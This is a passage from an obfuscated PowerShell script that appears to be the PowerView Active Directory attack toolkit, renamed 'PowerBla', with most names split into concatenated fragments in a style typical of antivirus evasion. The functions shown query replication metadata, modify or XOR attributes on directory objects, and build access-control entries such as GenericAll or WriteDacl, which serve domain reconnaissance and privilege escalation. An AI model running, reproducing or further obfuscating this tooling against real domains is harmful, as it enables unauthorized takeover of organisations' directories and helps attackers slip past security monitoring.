            $Results | &('Whe'+'re'+'-O'+'bject') {$_} | &('ForE'+'ach-Ob'+'ject') {
                if ($PSBoundParameters[('Ra'+'w')]) {
                    $Object = $_
                    $Object.PSObject.TypeNames.Insert(0, ('PowerBl'+'a'+'.ADO'+'bje'+'ct.Ra'+'w'))
                }
                else {
                    $Object = &('C'+'onvert-LDA'+'P'+'Pr'+'operty') -Properties $_.Properties
                    $Object.PSObject.TypeNames.Insert(0, ('P'+'owerBl'+'a'+'.ADObjec'+'t'))
                }
                $Object
            }
            if ($Results) {
                try { $Results.dispose() }
                catch {
                    &('Wri'+'te-'+'Verb'+'o'+'se') ('['+'Get-DomainO'+'bje'+'c'+'t]'+' '+'Er'+'ror '+'disp'+'o'+'sin'+'g '+'of'+' '+'the'+' '+'Resul'+'t'+'s '+'ob'+'jec'+'t: '+"$_")
                }
            }
            $ObjectSearcher.dispose()
        }
    }
}


function Get-DomainObjectAttributeHistory {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('PSU'+'seDeclared'+'Vars'+'More'+'T'+'hanA'+'ssig'+'nme'+'nts'), '')]
    [OutputType(('P'+'ow'+'erBla.ADO'+'bj'+'ectAt'+'trib'+'ut'+'eHis'+'tor'+'y'))]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias(('Dis'+'ting'+'u'+'is'+'hedName'), ('Sam'+'Acc'+'o'+'untName'), ('Nam'+'e'), ('Membe'+'r'+'D'+'istingui'+'sh'+'edN'+'ame'), ('Mem'+'b'+'erName'))]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias(('Fil'+'ter'))]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias(('A'+'DSPath'))]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(('D'+'om'+'ainCo'+'ntrol'+'ler'))]
        [String]
        $Server,

        [ValidateSet(('Ba'+'se'), ('O'+'neLev'+'el'), ('Subt'+'ree'))]
        [String]
        $SearchScope = ('Subt'+'r'+'ee'),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $SearcherArguments = @{
            ('P'+'ropertie'+'s')    =   ('msds-repl'+'a'+'t'+'tribut'+'emetadat'+'a'),('distin'+'gu'+'ish'+'ednam'+'e')
            ('Ra'+'w')           =   $True
        }
        if ($PSBoundParameters[('D'+'omain')]) { $SearcherArguments[('Dom'+'ai'+'n')] = $Domain }
        if ($PSBoundParameters[('L'+'D'+'APFilter')]) { $SearcherArguments[('LDAPFi'+'lte'+'r')] = $LDAPFilter }
        if ($PSBoundParameters[('Searc'+'h'+'Ba'+'se')]) { $SearcherArguments[('SearchB'+'a'+'se')] = $SearchBase }
        if ($PSBoundParameters[('S'+'erv'+'er')]) { $SearcherArguments[('Ser'+'ver')] = $Server }
        if ($PSBoundParameters[('Sear'+'c'+'hScope')]) { $SearcherArguments[('SearchS'+'co'+'pe')] = $SearchScope }
        if ($PSBoundParameters[('Resu'+'lt'+'P'+'ageSize')]) { $SearcherArguments[('Re'+'sul'+'tPag'+'eSiz'+'e')] = $ResultPageSize }
        if ($PSBoundParameters[('S'+'erverTi'+'me'+'L'+'imit')]) { $SearcherArguments[('Serve'+'r'+'Ti'+'meLimi'+'t')] = $ServerTimeLimit }
        if ($PSBoundParameters[('Tomb'+'s'+'tone')]) { $SearcherArguments[('T'+'omb'+'stone')] = $Tombstone }
        if ($PSBoundParameters[('Find'+'O'+'ne')]) { $SearcherArguments[('F'+'in'+'dOne')] = $FindOne }
        if ($PSBoundParameters[('Cr'+'ed'+'ential')]) { $SearcherArguments[('Cr'+'ed'+'ential')] = $Credential }

        if ($PSBoundParameters[('P'+'ropertie'+'s')]) {
            $PropertyFilter = $PSBoundParameters[('Pr'+'opert'+'i'+'es')] -Join '|'
        }
        else {
            $PropertyFilter = ''
        }
    }

    PROCESS {
        if ($PSBoundParameters[('Iden'+'ti'+'ty')]) { $SearcherArguments[('I'+'denti'+'ty')] = $Identity }

        &('Ge'+'t-D'+'o'+'mainOb'+'j'+'ect') @SearcherArguments | &('ForEa'+'ch-'+'Ob'+'jec'+'t') {
            $ObjectDN = $_.Properties[('d'+'ist'+'ingu'+'ishe'+'dname')][0]
            ForEach($XMLNode in $_.Properties[('ms'+'ds-'+'replatt'+'r'+'ibutemeta'+'data')]) {
                $TempObject = [xml]$XMLNode | &('Sele'+'c'+'t-Ob'+'ject') -ExpandProperty ('DS_REP'+'L_A'+'TTR_META_DA'+'T'+'A') -ErrorAction SilentlyContinue
                if ($TempObject) {
                    if ($TempObject.pszAttributeName -Match $PropertyFilter) {
                        $Output = &('N'+'e'+'w-Object') PSObject
                        $Output | &('A'+'d'+'d-Member') NoteProperty ('Obj'+'e'+'ctDN') $ObjectDN
                        $Output | &('Ad'+'d'+'-Member') NoteProperty ('At'+'t'+'ribu'+'teName') $TempObject.pszAttributeName
                        $Output | &('Ad'+'d'+'-Membe'+'r') NoteProperty ('L'+'a'+'st'+'O'+'rigi'+'natingChang'+'e') $TempObject.ftimeLastOriginatingChange
                        $Output | &('A'+'dd-M'+'ember') NoteProperty ('Versio'+'n') $TempObject.dwVersion
                        $Output | &('A'+'dd-Me'+'mbe'+'r') NoteProperty ('Las'+'tO'+'rigin'+'ati'+'ngDsaD'+'N') $TempObject.pszLastOriginatingDsaDN
                        $Output.PSObject.TypeNames.Insert(0, ('P'+'owerB'+'la.ADObj'+'ectAt'+'tributeHis'+'t'+'ory'))
                        $Output
                    }
                }
                else {
                    &('Writ'+'e-'+'Verb'+'ose') ('[G'+'et-D'+'omainOb'+'j'+'ec'+'tAttr'+'i'+'b'+'u'+'teHistory]'+' '+'Err'+'or '+'re'+'tri'+'evi'+'ng '+(('XdA'+'ms'+'ds'+'-replatt'+'r'+'ibute'+'meta'+'d'+'ataXdA ')  -rEplace ([chAr]88+[chAr]100+[chAr]65),[chAr]39)+'fo'+'r '+"'$ObjectDN'")
                }
            }
        }
    }
}


function Get-DomainObjectLinkedAttributeHistory {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('PS'+'U'+'s'+'eD'+'eclaredVarsMoreTh'+'anAssignment'+'s'), '')]
    [OutputType(('P'+'owerBla'+'.ADO'+'bje'+'c'+'t'+'Linked'+'Att'+'ribut'+'eHist'+'ory'))]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias(('Di'+'stinguis'+'h'+'e'+'dName'), ('Sam'+'Accoun'+'tN'+'a'+'me'), ('Na'+'me'), ('Mem'+'ber'+'Di'+'sting'+'u'+'ishedNam'+'e'), ('M'+'emb'+'erName'))]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias(('Fi'+'lt'+'er'))]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias(('ADS'+'Pat'+'h'))]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(('Domain'+'Contr'+'ol'+'l'+'er'))]
        [String]
        $Server,

        [ValidateSet(('Bas'+'e'), ('O'+'neL'+'evel'), ('S'+'u'+'btree'))]
        [String]
        $SearchScope = ('Sub'+'t'+'ree'),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $SearcherArguments = @{
            ('P'+'r'+'opert'+'ies')    =   ('m'+'sd'+'s-'+'replvaluem'+'et'+'adata'),('d'+'i'+'stingui'+'shednam'+'e')
            ('Ra'+'w')           =   $True
        }
        if ($PSBoundParameters[('Dom'+'ain')]) { $SearcherArguments[('D'+'omain')] = $Domain }
        if ($PSBoundParameters[('LDAPFilt'+'e'+'r')]) { $SearcherArguments[('LDAPF'+'ilte'+'r')] = $LDAPFilter }
        if ($PSBoundParameters[('S'+'earchB'+'ase')]) { $SearcherArguments[('Search'+'Ba'+'se')] = $SearchBase }
        if ($PSBoundParameters[('S'+'erver')]) { $SearcherArguments[('Serv'+'er')] = $Server }
        if ($PSBoundParameters[('Sear'+'c'+'hSco'+'pe')]) { $SearcherArguments[('Sear'+'ch'+'Scope')] = $SearchScope }
        if ($PSBoundParameters[('Resu'+'ltPa'+'geSi'+'ze')]) { $SearcherArguments[('Res'+'ult'+'PageS'+'iz'+'e')] = $ResultPageSize }
        if ($PSBoundParameters[('ServerTimeL'+'i'+'mi'+'t')]) { $SearcherArguments[('S'+'erverT'+'imeLi'+'mit')] = $ServerTimeLimit }
        if ($PSBoundParameters[('T'+'ombs'+'tone')]) { $SearcherArguments[('Tomb'+'st'+'one')] = $Tombstone }
        if ($PSBoundParameters[('Cr'+'ede'+'nt'+'ial')]) { $SearcherArguments[('Creden'+'t'+'i'+'al')] = $Credential }

        if ($PSBoundParameters[('Pr'+'oper'+'t'+'ies')]) {
            $PropertyFilter = $PSBoundParameters[('Pro'+'pert'+'ies')] -Join '|'
        }
        else {
            $PropertyFilter = ''
        }
    }

    PROCESS {
        if ($PSBoundParameters[('Ide'+'ntity')]) { $SearcherArguments[('Ide'+'n'+'tity')] = $Identity }

        &('Get-Do'+'main'+'Obj'+'ect') @SearcherArguments | &('ForE'+'a'+'ch-O'+'bject') {
            $ObjectDN = $_.Properties[('disti'+'n'+'g'+'uis'+'hedname')][0]
            ForEach($XMLNode in $_.Properties[('ms'+'ds-r'+'epl'+'v'+'aluemetada'+'t'+'a')]) {
                $TempObject = [xml]$XMLNode | &('Sele'+'ct-'+'Object') -ExpandProperty ('D'+'S'+'_REPL'+'_VAL'+'UE_M'+'ETA_DATA') -ErrorAction SilentlyContinue
                if ($TempObject) {
                    if ($TempObject.pszAttributeName -Match $PropertyFilter) {
                        $Output = &('New-Ob'+'j'+'ect') PSObject
                        $Output | &('Add-M'+'e'+'m'+'ber') NoteProperty ('O'+'bj'+'ectDN') $ObjectDN
                        $Output | &('A'+'dd-M'+'ember') NoteProperty ('Attri'+'b'+'uteName') $TempObject.pszAttributeName
                        $Output | &('A'+'dd-Memb'+'er') NoteProperty ('A'+'ttributeVa'+'lu'+'e') $TempObject.pszObjectDn
                        $Output | &('Ad'+'d-M'+'emb'+'er') NoteProperty ('Tim'+'eC'+'r'+'eated') $TempObject.ftimeCreated
                        $Output | &('Add'+'-'+'Member') NoteProperty ('TimeD'+'el'+'eted') $TempObject.ftimeDeleted
                        $Output | &('Add-Me'+'mbe'+'r') NoteProperty ('Last'+'Orig'+'i'+'n'+'ati'+'n'+'gChange') $TempObject.ftimeLastOriginatingChange
                        $Output | &('Add'+'-Membe'+'r') NoteProperty ('Ver'+'sion') $TempObject.dwVersion
                        $Output | &('Add-'+'Me'+'mber') NoteProperty ('L'+'astO'+'ri'+'gin'+'atingDs'+'aDN') $TempObject.pszLastOriginatingDsaDN
                        $Output.PSObject.TypeNames.Insert(0, ('Pow'+'e'+'rBla'+'.A'+'DObje'+'ctLinke'+'dAttr'+'ibu'+'teHistory'))
                        $Output
                    }
                }
                else {
                    &('Write-V'+'erb'+'ose') ('[G'+'et-Do'+'m'+'ai'+'nOb'+'jec'+'tLink'+'edAttri'+'but'+'eH'+'istory'+'] '+'E'+'rr'+'or '+'ret'+'r'+'ieving '+('MXwmsd'+'s'+'-'+'repl'+'v'+'aluemet'+'adataMXw ').RePLacE('MXw',[string][Char]39)+'f'+'or '+"'$ObjectDN'")
                }
            }
        }
    }
}


function Set-DomainObject {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('P'+'SUseSh'+'o'+'uldProcessFor'+'Sta'+'teC'+'ha'+'ngin'+'gF'+'u'+'n'+'ctio'+'ns'), '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('PS'+'Shoul'+'d'+'Process'), '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias(('Dis'+'t'+'ingu'+'ish'+'ed'+'Name'), ('Sa'+'mAcc'+'ou'+'nt'+'Name'), ('N'+'ame'))]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [Alias(('Re'+'p'+'lace'))]
        [Hashtable]
        $Set,

        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $XOR,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Clear,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias(('Fi'+'lt'+'er'))]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias(('ADSPa'+'th'))]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(('Do'+'mai'+'nControll'+'er'))]
        [String]
        $Server,

        [ValidateSet(('Bas'+'e'), ('One'+'Le'+'vel'), ('Subt'+'re'+'e'))]
        [String]
        $SearchScope = ('Subtre'+'e'),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $SearcherArguments = @{('Ra'+'w') = $True}
        if ($PSBoundParameters[('Do'+'main')]) { $SearcherArguments[('Do'+'mai'+'n')] = $Domain }
        if ($PSBoundParameters[('LDAPFil'+'t'+'er')]) { $SearcherArguments[('LD'+'APF'+'ilter')] = $LDAPFilter }
        if ($PSBoundParameters[('S'+'earch'+'Bas'+'e')]) { $SearcherArguments[('Se'+'ar'+'chBase')] = $SearchBase }
        if ($PSBoundParameters[('Ser'+'ver')]) { $SearcherArguments[('Serv'+'er')] = $Server }
        if ($PSBoundParameters[('Sea'+'rchScop'+'e')]) { $SearcherArguments[('Sear'+'c'+'h'+'Scope')] = $SearchScope }
        if ($PSBoundParameters[('R'+'es'+'ultP'+'ageSize')]) { $SearcherArguments[('Re'+'su'+'lt'+'Pa'+'geSize')] = $ResultPageSize }
        if ($PSBoundParameters[('ServerTimeL'+'im'+'i'+'t')]) { $SearcherArguments[('Se'+'rverTimeL'+'im'+'it')] = $ServerTimeLimit }
        if ($PSBoundParameters[('Tombst'+'o'+'ne')]) { $SearcherArguments[('Tomb'+'ston'+'e')] = $Tombstone }
        if ($PSBoundParameters[('Cr'+'edentia'+'l')]) { $SearcherArguments[('Cr'+'edent'+'ial')] = $Credential }
    }

    PROCESS {
        if ($PSBoundParameters[('Ident'+'i'+'ty')]) { $SearcherArguments[('I'+'d'+'entity')] = $Identity }

        $RawObject = &('G'+'et-Doma'+'i'+'nObj'+'ect') @SearcherArguments

        ForEach ($Object in $RawObject) {

            $Entry = $RawObject.GetDirectoryEntry()

            if($PSBoundParameters[('S'+'et')]) {
                try {
                    $PSBoundParameters[('Se'+'t')].GetEnumerator() | &('ForE'+'ach-'+'Object') {
                        &('Wri'+'te-'+'Verbose') "[Set-DomainObject] Setting '$($_.Name)' to '$($_.Value)' for object '$($RawObject.Properties.samaccountname)' "
                        $Entry.put($_.Name, $_.Value)
                    }
                    $Entry.commitchanges()
                }
                catch {
                    &('Write-'+'W'+'arning') "[Set-DomainObject] Error setting/replacing properties for object '$($RawObject.Properties.samaccountname)' : $_ "
                }
            }
            if($PSBoundParameters[('X'+'OR')]) {
                try {
                    $PSBoundParameters[('XO'+'R')].GetEnumerator() | &('ForEach-O'+'b'+'ject') {
                        $PropertyName = $_.Name
                        $PropertyXorValue = $_.Value
                        &('W'+'ri'+'te-Ver'+'bose') "[Set-DomainObject] XORing '$PropertyName' with '$PropertyXorValue' for object '$($RawObject.Properties.samaccountname)' "
                        $TypeName = $Entry.$PropertyName[0].GetType().name

                        $PropertyValue = $($Entry.$PropertyName) -bxor $PropertyXorValue
                        $Entry.$PropertyName = $PropertyValue -as $TypeName
                    }
                    $Entry.commitchanges()
                }
                catch {
                    &('W'+'rite-Wa'+'rning') "[Set-DomainObject] Error XOR'ing properties for object '$($RawObject.Properties.samaccountname)' : $_ "
                }
            }
            if($PSBoundParameters[('Cle'+'ar')]) {
                try {
                    $PSBoundParameters[('Cl'+'ear')] | &('Fo'+'rE'+'ach-'+'Object') {
                        $PropertyName = $_
                        &('Wri'+'te-'+'Verbos'+'e') "[Set-DomainObject] Clearing '$PropertyName' for object '$($RawObject.Properties.samaccountname)' "
                        $Entry.$PropertyName.clear()
                    }
                    $Entry.commitchanges()
                }
                catch {
                    &('Writ'+'e-Warni'+'ng') "[Set-DomainObject] Error clearing properties for object '$($RawObject.Properties.samaccountname)' : $_ "
                }
            }
        }
    }
}


function ConvertFrom-LDAPLogonHours {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('PSUse'+'Declar'+'edVarsMoreT'+'h'+'anAssig'+'n'+'m'+'e'+'nt'+'s'), '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('PSShould'+'Proce'+'s'+'s'), '')]
    [OutputType(('Po'+'w'+'erBla.Lo'+'gonHours'))]
    [CmdletBinding()]
    Param (
        [Parameter( ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [byte[]]
        $LogonHoursArray
    )

    Begin {
        if($LogonHoursArray.Count -ne 21) {
            throw ('Lo'+'gonHou'+'r'+'sArray i'+'s th'+'e inco'+'rrect'+' '+'len'+'g'+'t'+'h')
        }

        function ConvertTo-LogonHoursArray {
            Param (
                [int[]]
                $HoursArr
            )

            $LogonHours = &('New'+'-Ob'+'ject') bool[] 24
            for($i=0; $i -lt 3; $i++) {
                $Byte = $HoursArr[$i]
                $Offset = $i * 8
                $Str = [Convert]::ToString($Byte,2).PadLeft(8,'0')

                $LogonHours[$Offset+0] = [bool] [convert]::ToInt32([string]$Str[7])
                $LogonHours[$Offset+1] = [bool] [convert]::ToInt32([string]$Str[6])
                $LogonHours[$Offset+2] = [bool] [convert]::ToInt32([string]$Str[5])
                $LogonHours[$Offset+3] = [bool] [convert]::ToInt32([string]$Str[4])
                $LogonHours[$Offset+4] = [bool] [convert]::ToInt32([string]$Str[3])
                $LogonHours[$Offset+5] = [bool] [convert]::ToInt32([string]$Str[2])
                $LogonHours[$Offset+6] = [bool] [convert]::ToInt32([string]$Str[1])
                $LogonHours[$Offset+7] = [bool] [convert]::ToInt32([string]$Str[0])
            }

            $LogonHours
        }
    }

    Process {
        $Output = @{
            Sunday = &('Conv'+'er'+'tTo-Logo'+'nHou'+'r'+'sArra'+'y') -HoursArr $LogonHoursArray[0..2]
            Monday = &('C'+'o'+'nvertTo-Logo'+'n'+'Ho'+'ursA'+'r'+'ray') -HoursArr $LogonHoursArray[3..5]
            Tuesday = &('Conve'+'rtTo-'+'Lo'+'gonHour'+'sArray') -HoursArr $LogonHoursArray[6..8]
            Wednesday = &('ConvertTo-L'+'o'+'go'+'nHo'+'ursA'+'rr'+'ay') -HoursArr $LogonHoursArray[9..11]
            Thurs = &('C'+'on'+'ver'+'tTo-L'+'ogo'+'nHoursArray') -HoursArr $LogonHoursArray[12..14]
            Friday = &('Convert'+'To-Lo'+'g'+'o'+'nH'+'oursArra'+'y') -HoursArr $LogonHoursArray[15..17]
            Saturday = &('Co'+'nvertTo-L'+'o'+'gonH'+'ours'+'A'+'rray') -HoursArr $LogonHoursArray[18..20]
        }

        $Output = &('N'+'ew-Obj'+'ect') PSObject -Property $Output
        $Output.PSObject.TypeNames.Insert(0, ('P'+'owerBla.Lo'+'go'+'n'+'Hours'))
        $Output
    }
}


function New-ADObjectAccessControlEntry {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('P'+'SUseS'+'h'+'ou'+'ldP'+'roces'+'sForStateCha'+'ngingF'+'unction'+'s'), '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('PSS'+'ho'+'u'+'ldProces'+'s'), '')]
    [OutputType(('System.Sec'+'u'+'r'+'i'+'t'+'y.AccessCont'+'rol.'+'Au'+'tho'+'rizationR'+'ule'))]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True, Mandatory = $True)]
        [Alias(('Distingu'+'is'+'h'+'edName'), ('SamA'+'cco'+'unt'+'N'+'ame'), ('Nam'+'e'))]
        [String]
        $PrincipalIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        $PrincipalDomain,

        [ValidateNotNullOrEmpty()]
        [Alias(('Domai'+'nCont'+'rol'+'ler'))]
        [String]
        $Server,

        [ValidateSet(('Ba'+'se'), ('O'+'neLeve'+'l'), ('Su'+'btree'))]
        [String]
        $SearchScope = ('Subt'+'r'+'ee'),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $True)]
        [ValidateSet(('Acce'+'s'+'s'+'SystemSe'+'curit'+'y'), ('Cr'+'eate'+'Child'),('D'+'elete'),('Del'+'ete'+'Chi'+'ld'),('De'+'le'+'teTree'),('E'+'xt'+'e'+'n'+'dedRight'),('G'+'eneri'+'cAll'),('G'+'ene'+'ricE'+'x'+'ecute'),('Generi'+'c'+'Read'),('Gen'+'ericW'+'r'+'ite'),('List'+'Chi'+'l'+'dren'),('Lis'+'tObj'+'ect'),('Re'+'ad'+'Contr'+'ol'),('Rea'+'dP'+'ropert'+'y'),('Se'+'lf'),('S'+'ynch'+'roniz'+'e'),('Write'+'Da'+'cl'),('WriteO'+'w'+'ner'),('Wr'+'it'+'eProp'+'erty'))]
        $Right,

        [Parameter(Mandatory = $True, ParameterSetName="aC`Ces`SrUleTYPE")]
        [ValidateSet(('A'+'llow'), ('D'+'eny'))]
        [String[]]
        $AccessControlType,

        [Parameter(Mandatory = $True, ParameterSetName="a`U`d`I`TrULETYPe")]
        [ValidateSet(('S'+'uccess'), ('Fa'+'ilure'))]
        [String]
        $AuditFlag,

        [Parameter(Mandatory = $False, ParameterSetName="aCCE`ssRULeTY`Pe")]
        [Parameter(Mandatory = $False, ParameterSetName="Au`Di`Tru`l`ETYpE")]
        [Parameter(Mandatory = $False, ParameterSetName="OB`JEctGU`id`LOOKUp")]
        [Guid]
        $ObjectType,

        [ValidateSet(('A'+'ll'), ('Ch'+'ildre'+'n'),('Descend'+'en'+'ts'),('Non'+'e'),('Se'+'lfAndChil'+'dre'+'n'))]
        [String]
        $InheritanceType,

        [Guid]
        $InheritedObjectType
    )

    Begin {
        if ($PrincipalIdentity -notmatch ('^'+'S-1-.'+'*')) {
            $PrincipalSearcherArguments = @{
                ('Ide'+'ntity') = $PrincipalIdentity
                ('Pr'+'operti'+'es') = ('dis'+'tin'+'g'+'u'+'is'+'h'+'edname,o'+'bjectsid')
            }
            if ($PSBoundParameters[('Pr'+'incipa'+'lDo'+'main')]) { $PrincipalSearcherArguments[('Dom'+'ai'+'n')] = $PrincipalDomain }
            if ($PSBoundParameters[('Ser'+'ve'+'r')]) { $PrincipalSearcherArguments[('S'+'erver')] = $Server }
            if ($PSBoundParameters[('S'+'earc'+'hScope')]) { $PrincipalSearcherArguments[('Sear'+'chSc'+'o'+'pe')] = $SearchScope }
            if ($PSBoundParameters[('Resul'+'tPag'+'eSize')]) { $PrincipalSearcherArguments[('Resul'+'tPageSi'+'z'+'e')] = $ResultPageSize }
            if ($PSBoundParameters[('Serve'+'rTim'+'e'+'Limi'+'t')]) { $PrincipalSearcherArguments[('Se'+'rve'+'rTimeLi'+'mit')] = $ServerTimeLimit }
            if ($PSBoundParameters[('Tom'+'b'+'stone')]) { $PrincipalSearcherArguments[('Tom'+'b'+'stone')] = $Tombstone }
            if ($PSBoundParameters[('C'+'reden'+'tial')]) { $PrincipalSearcherArguments[('Cr'+'ed'+'ential')] = $Credential }
            $Principal = &('Ge'+'t'+'-D'+'om'+'ainObject') @PrincipalSearcherArguments
            if (-not $Principal) {
                throw ('Una'+'ble'+' '+'to'+' '+'r'+'esolv'+'e '+'pri'+'nc'+'i'+'pal: '+"$PrincipalIdentity")
            }
            elseif($Principal.Count -gt 1) {
                throw ('PrincipalIden'+'tity m'+'atche'+'s mul'+'tiple A'+'D objects, b'+'ut '+'o'+'nl'+'y o'+'ne i'+'s allowed')
            }
            $ObjectSid = $Principal.objectsid
        }
        else {
            $ObjectSid = $PrincipalIdentity
        }

        $ADRight = 0
        foreach($r in $Right) {
            $ADRight = $ADRight -bor (([System.DirectoryServices.ActiveDirectoryRights]$r).value__)
        }
        $ADRight = [System.DirectoryServices.ActiveDirectoryRights]$ADRight

        $Identity = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$ObjectSid)
    }

    Process {
        if($PSCmdlet.ParameterSetName -eq ('Aud'+'it'+'RuleT'+'ype')) {

            if($ObjectType -eq $null -and $InheritanceType -eq [String]::Empty -and $InheritedObjectType -eq $null) {
                &('New'+'-O'+'bject') System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, $ADRight, $AuditFlag
            } elseif($ObjectType -eq $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -eq $null) {
                &('N'+'ew-'+'Obje'+'ct') System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, $ADRight, $AuditFlag, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$InheritanceType)
            } elseif($ObjectType -eq $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -ne $null) {
                &('New-'+'Objec'+'t') System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, $ADRight, $AuditFlag, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$InheritanceType), $InheritedObjectType
            } elseif($ObjectType -ne $null -and $InheritanceType -eq [String]::Empty -and $InheritedObjectType -eq $null) {
                &('Ne'+'w-O'+'bje'+'ct') System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, $ADRight, $AuditFlag, $ObjectType
            } elseif($ObjectType -ne $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -eq $null) {
                &('New-Obj'+'ec'+'t') System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, $ADRight, $AuditFlag, $ObjectType, $InheritanceType
            } elseif($ObjectType -ne $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -ne $null) {
                &('New'+'-Obj'+'ect') System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, $ADRight, $AuditFlag, $ObjectType, $InheritanceType, $InheritedObjectType
            }

        }
        else {

            if($ObjectType -eq $null -and $InheritanceType -eq [String]::Empty -and $InheritedObjectType -eq $null) {
                &('Ne'+'w-Obje'+'c'+'t') System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, $ADRight, $AccessControlType
            } elseif($ObjectType -eq $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -eq $null) {
                &('New-'+'Objec'+'t') System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, $ADRight, $AccessControlType, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$InheritanceType)
            } elseif($ObjectType -eq $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -ne $null) {
                &('Ne'+'w-Ob'+'ject') System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, $ADRight, $AccessControlType, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$InheritanceType), $InheritedObjectType
            } elseif($ObjectType -ne $null -and $InheritanceType -eq [String]::Empty -and $InheritedObjectType -eq $null) {
                &('Ne'+'w'+'-'+'Object') System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, $ADRight, $AccessControlType, $ObjectType
            } elseif($ObjectType -ne $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -eq $null) {
                &('N'+'ew-Ob'+'j'+'ect') System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, $ADRight, $AccessControlType, $ObjectType, $InheritanceType
            } elseif($ObjectType -ne $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -ne $null) {
                &('N'+'ew-Ob'+'ject') System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, $ADRight, $AccessControlType, $ObjectType, $InheritanceType, $InheritedObjectType
            }

        }
    }
}


function Set-DomainObjectOwner {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('PS'+'Use'+'ShouldP'+'roces'+'sForSta'+'teCh'+'a'+'ngingF'+'unc'+'tions'), '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('PSShoul'+'d'+'Process'), '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
